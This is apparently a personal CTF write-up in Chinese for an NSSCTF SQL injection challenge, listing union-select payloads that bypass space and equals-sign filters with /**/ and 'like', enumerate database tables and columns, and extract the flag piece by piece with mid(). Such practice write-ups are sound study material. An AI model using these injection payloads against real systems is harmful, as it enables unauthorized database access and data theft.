#SQL注入 
对比[[easy_sql]]

增加了对 空格 等号 的过滤

分别可用 ` /**/` ` like`  替代

```sql
wllm=-1'/**/union/**/select/**/1,2,3%23

2

wllm=-1'/**/union/**/select/**/1,database(),3%23

test_db

wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'%23

LTLT_flag,users

wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'%23
=>id,flag,id,username

wllm=-1'/**/union/**/select/**/1,flag,3/**/from/**/LTLT_flag%23

NSSCTF{6651e51a-22a1

substr，right，REVERSE 被过滤，只能用mid

?wllm=-1'/**/union/**/select/**/1,mid(flag,20,20),3/**/from/**/LTLT_flag%23
=>1-4127-a3d8-bdc75262

类似的得出后面部分
=>8-bdc752623e30}


```
